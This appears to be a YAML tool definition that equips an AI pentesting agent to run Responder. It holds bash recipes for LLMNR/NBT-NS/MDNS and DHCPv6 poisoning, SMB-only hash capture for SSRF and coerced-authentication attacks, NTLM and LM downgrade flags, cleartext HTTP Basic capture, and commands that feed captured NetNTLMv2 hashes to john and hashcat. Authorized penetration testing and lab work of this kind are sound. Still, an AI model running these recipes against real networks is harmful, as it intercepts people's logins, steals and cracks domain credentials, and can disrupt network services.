name: responder
kind: cli
binary: responder
version: "3.2.2"
description: "LLMNR/NBT-NS/MDNS broadcast poisoning and NTLMv2 hash capture via Responder v3.2.2 (lgandx/Responder, Kali apt package responder). Three operational modes via flag combinations: full poison (default, all 18 rogue servers + LLMNR/NBT-NS/MDNS poisoners), passive analyze (-A flag, listen-only no responses), SMB-only capture (uses pre-baked Responder-smb-only.conf for SSRF-triggered or coerced-auth capture). Captures NTLMv2/NTLMv1 hashes in hashcat-compatible format (mode 5600/5500/7500) into /usr/share/responder/logs/<PROTO>-NTLMv*-<IP>.txt — agent copies these to /session/output/responder/ for persistence. Captured hashes also stored in Responder.db SQLite for structured queries. Time-bounded: requires `timeout DURATION responder ...` wrapping. Container needs --privileged (NET_RAW + NET_ADMIN + privileged ports <1024) and --network=host (broadcast/multicast visibility) — both handled automatically by plugin when requirements.privileged: true."
image: "ghcr.io/silicon-works/mcp-tools-responder:latest"
image_size_mb: 250

# Dual-clock model — responder is duration-bounded by `timeout` wrapper:
#   idle_timeout_seconds — 10min cap; longer than typical durations.
#   max_runtime_seconds — 10min hard cap; agent should pass `timeout`
#     ≤ 540s in the recipe, leaving 60s for cleanup/file-copy overhead.
idle_timeout_seconds: 600
max_runtime_seconds: 600
timeout_seconds: 600

capabilities:
  - hash_capture
  - llmnr_poisoning
  - nbtns_poisoning
  - mdns_poisoning
  - smb_hash_capture
  - wpad_poisoning
  - dhcpv6_poisoning
  - rdnss_poisoning

phases:
  - exploitation

requirements:
  network: true
  privileged: true
  privileged_reason: "Requires raw sockets (NET_RAW) for LLMNR/NBT-NS/MDNS poisoning, network admin (NET_ADMIN) for multicast group membership, and privileged ports (<1024) for rogue servers. Plugin defaults to --network=host so Layer 2 broadcast/multicast traffic reaches the container."

resources:
  memory_mb: 256
  cpu: 0.5

routing:
  use_for:
    - "capture NTLMv2 hashes via LLMNR/NBT-NS/MDNS poisoning on the local network"
    - "poison broadcast name resolution to intercept Windows authentication requests"
    - "set up SMB listener to capture hashes from SSRF or forced authentication attacks"
    - "passively analyze broadcast protocol activity on a network segment without poisoning"
    - "capture NetNTLMv2 hashes for offline cracking with hashcat or john"
    - "perform LLMNR poisoning to obtain domain user credentials on an internal network"
    - "capture NTLMv1 hashes with LM downgrade for easier offline cracking"
    - "run rogue WPAD proxy to capture browser proxy authentication"
    - "capture cleartext credentials via HTTP Basic auth downgrade"
    - "set up hash capture listener for coerced authentication attacks (PetitPotam, PrinterBug, DFSCoerce)"
    - "force proxy authentication on all HTTP clients with -P (ProxyAuth) to capture NTLMv2 hashes"
    - "poison IPv6 name resolution via DHCPv6 or RDNSS Router Advertisement on dual-stack networks"
    - "capture WebDAV authentication by returning STATUS_LOGON_FAILURE with -E (ErrorCode)"
  never_use_for:
    - "NTLM relay attacks (use impacket-ntlmrelayx — Responder captures hashes, ntlmrelayx relays them)"
    - "password cracking (use john or hashcat — Responder captures hashes, cracking tools crack them)"
    - "port scanning (use nmap — Responder is a listener, not a scanner)"
    - "credential spraying (use kerbrute — Responder is passive capture, not active authentication)"
    - "SMB enumeration (use netexec — Responder runs rogue servers, not SMB client queries)"
    - "ARP poisoning (use bettercap/ettercap — Responder poisons name resolution, not ARP)"
  triggers:
    - "responder"
    - "LLMNR"
    - "NBT-NS"
    - "MDNS poisoning"
    - "hash capture"
    - "NTLMv2 capture"
    - "NetNTLM"
    - "WPAD"
    - "broadcast poisoning"
    - "SMB capture"
    - "forced authentication"
    - "SSRF hash capture"
    - "coerced auth capture"
    - "PetitPotam capture"
  prefer_over: []

see_also:
  - tool: john
    reason: "Crack captured NTLMv2 hashes (hashcat mode 5600) or NTLMv1 hashes (mode 5500) after Responder captures them. Hash files in /session/output/responder/logs/<PROTO>-NTLMv*.txt are line-oriented hashcat-format — feed directly to john."
  - tool: impacket
    reason: "Use impacket-ntlmrelayx (the binary inside the impacket kind:cli toolkit) to RELAY captured authentication instead of cracking it offline. impacket-secretsdump uses cracked credentials. impacket-ntlmrelayx pairs naturally with responder: poison broadcast → catch inbound auth → relay it to LDAPS/SMB/HTTP. See impacket gotchas for ntlmrelayx daemon-binary stdin keep-alive."
  - tool: netexec
    reason: "Validate cracked credentials across SMB, WinRM, LDAP, MSSQL after obtaining them via Responder."
  - tool: hashcat
    reason: "Responder captures NTLMv2 hashes in hashcat mode 5600 format. Use hashcat for GPU-accelerated cracking, especially with combinator or hybrid attacks."
  - tool: bloodhound
    reason: "After obtaining valid credentials via hash cracking, collect AD relationship data for attack path analysis."

target_extraction: []
reject_flags: []
reject_flags_reason: "responder takes no remote-target argument — it's a local listener. The agent passes -I <interface> (the local NIC to bind), no target host. No reject_flags apply."

usage_patterns:

  - name: "Pattern R1 — full poisoning mode (replaces method 'poison')"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/responder && timeout <duration> responder -I <interface> -v > /session/output/responder/stdout.log 2>&1; cp -r /usr/share/responder/logs /session/output/responder/ 2>/dev/null; cp /usr/share/responder/Responder.db /session/output/responder/ 2>/dev/null; ls /session/output/responder/logs/*-NTLMv*.txt 2>/dev/null'"
    when: "Run Responder in full poison mode for <duration> seconds (recommend 60-300 for network poisoning, 15-30 for SSRF capture). Captures hashes to hashcat-format files in /session/output/responder/logs/. After timeout, the trailing `ls` lists captured hash files for the agent to Read. For interface auto-detection (instead of hardcoded -I), see Pattern R-helper below. Add additional flags as needed: -w (WPAD proxy), -F (force WPAD auth), -b (HTTP Basic downgrade), -d (DHCPv4 — disrupts segment), --lm (LM downgrade), --disable-ess (NTLMv1 force), -P (proxy auth), --dhcpv6, --rdnss, -E (WebDAV STATUS_LOGON_FAILURE), -e <ip> (custom external v4), -6 <ip> (custom external v6), -t <ttl> (custom TTL)."

  - name: "Pattern R2 — passive analyze mode (replaces method 'analyze')"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/responder && timeout <duration> responder -I <interface> -A -v > /session/output/responder/stdout.log 2>&1; cp /usr/share/responder/logs/Analyzer-Session.log /session/output/responder/ 2>/dev/null'"
    when: "Listen-only mode: responder observes LLMNR/NBT-NS/MDNS broadcasts but does NOT respond and does NOT start rogue servers. -A is the analyze flag. No hashes captured. Output to /session/output/responder/Analyzer-Session.log shows what hostnames clients are querying — useful for first-step reconnaissance to decide whether poisoning is worthwhile, or when engagement rules prohibit active poisoning."

  - name: "Pattern R3 — SMB-only capture (replaces method 'capture_smb')"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/responder && cp /usr/share/responder/Responder-smb-only.conf /usr/share/responder/Responder.conf && timeout <duration> responder -I <interface> -v > /session/output/responder/stdout.log 2>&1; cp -r /usr/share/responder/logs /session/output/responder/ 2>/dev/null; cp /usr/share/responder/Responder.db /session/output/responder/ 2>/dev/null; cp /usr/share/responder/Responder.conf.bak /usr/share/responder/Responder.conf 2>/dev/null'"
    when: "SMB-only mode: all poisoners (LLMNR/NBT-NS/MDNS) and rogue servers (HTTP/HTTPS/DNS/LDAP/etc.) DISABLED — only the SMB server (port 445) listens. Used for SSRF-triggered hash capture (\\\\\\\\attacker_ip\\\\share UNC injection in a vulnerable web app) and coerced-auth attacks (PetitPotam, PrinterBug, DFSCoerce — coerce target machine to authenticate to attacker's SMB). Pre-baked Responder-smb-only.conf is in the image (built via Dockerfile RUN sed). The recipe swaps it in, runs responder, then restores Responder.conf.bak. Per-container isolation — concurrent capture_smb in two containers does not race. <duration>: 15-30s for SSRF, 60s+ for coerced auth."

  - name: "Pattern R-helper — auto-detect interface via ip -j addr"
    binary: "bash"
    command: "-c 'IFACE=$(ip -j addr | python3 -c \"import json,sys; ifaces=[i for i in json.load(sys.stdin) if i[\\\"ifname\\\"]!=\\\"lo\\\" and any(a.get(\\\"family\\\")==\\\"inet\\\" for a in i.get(\\\"addr_info\\\",[]))]; print(ifaces[0][\\\"ifname\\\"] if ifaces else \\\"\\\")\"); echo \"selected: $IFACE\"'"
    when: "Quick helper to pick the right interface when the agent doesn't know one to pass to -I. Returns the first non-loopback interface with an IPv4 address. tun0 is the typical VPN interface for HTB / lab engagements. For an explicit choice, hardcode (-I tun0). Use this helper if the agent isn't sure."

  - name: "Pattern R-cracking — feed captured NTLMv2 to john"
    binary: "bash"
    command: "-c 'cat /session/output/responder/logs/*-NTLMv2-*.txt 2>/dev/null | tee /session/output/responder/all-ntlmv2-hashes.txt; ls /session/output/responder/logs/'"
    when: "After Pattern R1 / R3 captures hashes, this concatenates all NTLMv2 hashes into a single file the agent feeds to john (mode 5600) or hashcat. Format: `username::DOMAIN:challenge:ntproofstr:blob` — one per line. john recipe: `john --format=netntlmv2 --wordlist=/path/to/rockyou.txt /session/output/responder/all-ntlmv2-hashes.txt`. hashcat recipe: `hashcat -m 5600 /session/output/responder/all-ntlmv2-hashes.txt /path/to/rockyou.txt`."

output_formats:
  - flag: ""
    format: "text"
    preferred: true
    notes: "Default: hash files written under /usr/share/responder/logs/ as hashcat-compatible text. Agent copies to /session/output/responder/ via the recipe's trailing cp commands."
  - flag: "(SQLite)"
    format: "sqlite_db"
    preferred: false
    notes: "Responder.db schema: table 'responder' with columns timestamp, module, type, client, hostname, user, cleartext, hash, fullhash. Query via sqlite3 CLI: `sqlite3 /session/output/responder/Responder.db \"SELECT * FROM responder\"`."

common_options:
  duration:
    - "<duration>: passed to outer `timeout` wrapper. Recommend 60-300s for network poisoning, 15-30s for SSRF, 60s+ for coerced auth. Cap at 540 (max_runtime_seconds 600 leaves 60s for cleanup/file-copy)."
  interface:
    - "-I <iface>: required. Network interface to bind. Use Pattern R-helper if unsure. tun0 is typical for HTB / lab engagements."
  poisoning:
    - "-A: passive analyze (no responses, no servers — Pattern R2 default)"
    - "-w: enable rogue WPAD proxy server"
    - "-F: force NTLM/Basic auth on wpad.dat retrieval (more aggressive)"
    - "-b: HTTP Basic auth downgrade (captures cleartext)"
    - "--lm: LM hash downgrade (faster cracking, only old Windows clients)"
    - "--disable-ess: NTLMv1 downgrade (hashcat 5500 cracks faster than 5600)"
    - "-d: DHCPv4 poisoning + WPAD injection (disruptive — may break DHCP for the segment)"
    - "--dhcpv6: DHCPv6 poisoning"
    - "--rdnss: IPv6 Router Advertisement RDNSS poisoning"
    - "-P: force NTLM/Basic auth on all HTTP requests (proxy auth) — incompatible with -w"
    - "-E: WebDAV STATUS_LOGON_FAILURE (forces re-auth, captures WebDAV NTLMv2)"
  network:
    - "-e <ipv4>: custom external IPv4 to poison responses with (default: -I interface IP)"
    - "-6 <ipv6>: custom external IPv6"
    - "-t <ttl>: custom TTL for poisoned answers"
  output:
    - "-v: verbose (recommended — see poisoning activity)"
    - "Note: ALL output also lands in /usr/share/responder/logs/ regardless of -v"

gotchas:
  - "TIME-BOUNDED DAEMON. responder runs FOREVER until killed. Every invocation MUST be wrapped with `timeout <duration>` outside the responder argv. Cap at 540s (max_runtime_seconds 600 leaves 60s for cleanup/cp). Without timeout, container hits max_runtime hard kill and the trailing cp commands never run — meaning hash files stay in /usr/share/responder/logs/ inside the container instead of /session/output/responder/."
  - "PRIVILEGED + HOST NETWORK auto-handled. tool.yaml has `requirements.privileged: true` so plugin adds --privileged automatically (NET_RAW + NET_ADMIN + <1024 ports). Plugin defaults to --network=host so broadcast/multicast traffic reaches the container. NO manual flag passing needed at the cli_in_container level — just invoke the binary."
  - "HASH FILE LOCATIONS — captured hashes land in /usr/share/responder/logs/<PROTO>-NTLMv2-<IP>.txt (line-oriented hashcat format). The recipe's trailing `cp -r /usr/share/responder/logs /session/output/responder/` copies them to the persistent /session volume. Agent reads via `cat /session/output/responder/logs/*-NTLMv*.txt` or via the registry's R-cracking pattern. Format: NTLMv2 = mode 5600, NTLMv1 = mode 5500, AS-REP (legacy) = mode 7500."
  - "RESPONDER.DB STRUCTURED ACCESS — captured hashes also stored in /usr/share/responder/Responder.db SQLite. After cp to /session/output/responder/Responder.db, query via `sqlite3 /session/output/responder/Responder.db \"SELECT timestamp, module, type, client, hostname, user, cleartext, fullhash FROM responder\"`. Useful for filtering by module (SMB only? HTTP only?) or by client IP. The hash files are simpler for cracking (hashcat-ready); the DB is better for structured queries (which client at what time)."
  - "INTERFACE AUTODETECT recipe (replaces wrapper's auto-detect logic): `IFACE=$(ip -j addr | python3 -c 'import json,sys; ifaces=[i for i in json.load(sys.stdin) if i[\"ifname\"]!=\"lo\" and any(a.get(\"family\")==\"inet\" for a in i.get(\"addr_info\",[]))]; print(ifaces[0][\"ifname\"] if ifaces else \"\")')`. tun0 is the typical VPN interface for HTB / lab engagements. For an explicit choice (recommended for clarity), pass `-I tun0` directly in the recipe."
  - "CAPTURE_SMB CONF SWAP — Pattern R3 swaps /usr/share/responder/Responder.conf for the pre-baked Responder-smb-only.conf (poisoners + non-SMB servers all disabled), then restores from Responder.conf.bak after the run. Both files baked into the image at build time (Dockerfile RUN sed). Per-container isolation: concurrent Pattern R3 calls in two containers each have their own /usr/share/responder/Responder.conf — no race. If you need to verify the swap worked, the recipe could include a pre-flight `grep '^SMB = ' /usr/share/responder/Responder.conf` (should print `SMB = On` while everything else is `Off`)."
  - "OUTPUT FORMAT in NTLMv2 hash files: `username::DOMAIN:challenge:ntproofstr:blob`. NTLMv1 format: `username::DOMAIN:lmresponse:ntresponse:challenge`. Cleartext (when -b HTTP Basic) format: lines `[!] [HTTP] Cleartext Client : <ip>` followed by `User : ...` / `Pass : ...` on subsequent lines. Agent identifies by which file (`*-NTLMv2-*.txt` vs `*-NTLMv1-*.txt` vs `*-Cleartext-*.txt`)."
  - "INCOMPATIBLE FLAG COMBOS — `-w` (WPAD proxy) and `-P` (force proxy auth) are mutually exclusive. `-d` (DHCPv4 poisoning) is DISRUPTIVE — may break DHCP on the entire network segment if the responder host wins the DHCP race. Use sparingly and only with explicit engagement scope authorization. `--lm` and `--disable-ess` are downgrade attacks that produce weaker hashes — useful when cracking budget is limited but no functional difference for capture rate."
  - "RESPONDER.CONF VERSION SKEW — Kali's responder package may upgrade between image rebuilds, and Responder.conf format may change. The Dockerfile's sed-based modification of Responder-smb-only.conf assumes the canonical line shape `^<Service> = On`. If responder upgrades change this format, the smb-only conf may not correctly disable services. SAFETY: Pattern R3 always restores from Responder.conf.bak (also pre-baked at build time), so worst case is the SMB-only mode degrades to full poison mode (logs more services than intended) — not silent failure. Verify with `grep '= On' /usr/share/responder/Responder-smb-only.conf` should show ONLY `SMB = On`."
  - "NO SUBAGENT REUSE — responder spawns its own SMB/HTTP/etc. listener processes inside the container. Running TWO responder instances in the same container would race on those ports; cli_in_container always spawns a fresh container per call so this is structurally impossible. Concurrent responder calls run in separate containers with separate /usr/share/responder/ filesystems."
  - "MID-FLIGHT PEEK — while a responder is running (one tool-runner spawn blocked on the timeout), a SEPARATE tool-runner spawn can read partial captures by `cat /session/output/responder/logs/*-NTLMv*.txt` IF the recipe's trailing `cp` has been reached. BUT: the `cp` only runs AFTER `timeout` returns. To get genuine mid-flight visibility, use `tee` in the recipe: e.g., wrap with `tee /session/output/responder/live.log` to mirror stdout to disk while responder runs. Default recipe captures only post-timeout."

failure_signatures:
  - signal: "Permission denied"
    layer: "permission"
    remediation: "Container missing --privileged or --network=host. Verify tool.yaml has `requirements.privileged: true` (plugin auto-adds --privileged). For host networking, plugin defaults to --network=host (manager.ts:382) — no override should be needed. If still failing, check whether HEADED=1 environment is forcing different network mode."
  - signal: "Address already in use"
    layer: "tcp"
    remediation: "Port conflict — another process already bound the port responder wants. Common: SMB (445), HTTP (80), HTTPS (443), DNS (53), LDAP (389). With --network=host, responder shares the host's port namespace — host's own services may collide. Either stop conflicting host service, or use Pattern R3 (SMB-only) to bind only port 445."
  - signal: "Could not detect interface"
    layer: "network_config"
    remediation: "Auto-detect failed (-I not specified, no non-loopback IPv4 interface). Pass -I explicitly. For HTB / lab: -I tun0. Run Pattern R-helper to enumerate available interfaces."
  - signal: "Sniffer didn't return"
    layer: "kernel_caps"
    remediation: "Raw socket capability missing (NET_RAW). Container needs --privileged. Verify with `capsh --print` inside container — should show cap_net_raw."
  - signal: "Settings file is missing"
    layer: "image_corruption"
    remediation: "Responder.conf missing from /usr/share/responder/. Image rebuild needed. If using Pattern R3 mid-execution: the swap happened but the conf was rolled back without backup. Restore from Responder.conf.bak via `cp /usr/share/responder/Responder.conf.bak /usr/share/responder/Responder.conf`."

help_commands:
  - name: "responder — help"
    binary: "responder"
    command: "--help"
    when: "Print responder's full flag list. target=null."
  - name: "responder — version"
    binary: "responder"
    command: "--version"
    when: "Print Responder version. target=null."
